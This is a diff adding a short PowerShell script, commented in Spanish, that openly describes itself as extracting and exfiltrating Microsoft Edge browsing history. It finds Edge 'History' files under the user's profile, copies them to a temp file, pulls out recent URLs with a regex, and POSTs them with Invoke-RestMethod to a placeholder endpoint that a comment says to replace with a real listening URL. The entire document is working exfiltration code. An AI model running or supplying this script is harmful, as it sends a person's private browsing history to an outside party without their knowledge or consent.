@@ -1,0 +1,19 @@
+# Script original: Extracción y exfiltración del historial de Microsoft Edge
+# Nota: Endpoint anonimizado. Reemplazar [ENDPOINT_CONTROLADO] por la URL de escucha real para pruebas.
+
+$files = Get-ChildItem -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Filter "History" -Recurse -ErrorAction SilentlyContinue
+
+if ($files) { 
+    $out = ""; 
+    foreach ($file in $files) { 
+        $temp = "$env:TEMP\eh.db"
+        Copy-Item $file.FullName $temp -Force
+        $bytes = [System.IO.File]::ReadAllBytes($temp)
+        $text = [System.Text.Encoding]::ASCII.GetString($bytes)
+        $urls = [regex]::Matches($text, "https?://[a-zA-Z0-9\.\-_/]+") | ForEach-Object { $_.Value } | Select-Object -Unique | Select-Object -Last 20
+        $out += ($urls -join "`n") + "`n" 
+    }; 
+    Invoke-RestMethod -Uri "https://[ENDPOINT_CONTROLADO]" -Method Post -Body $out 
+} else { 
+    Invoke-RestMethod -Uri "https://[ENDPOINT_CONTROLADO]" -Method Post -Body "No se encontro Edge o no tiene historial" 
+}
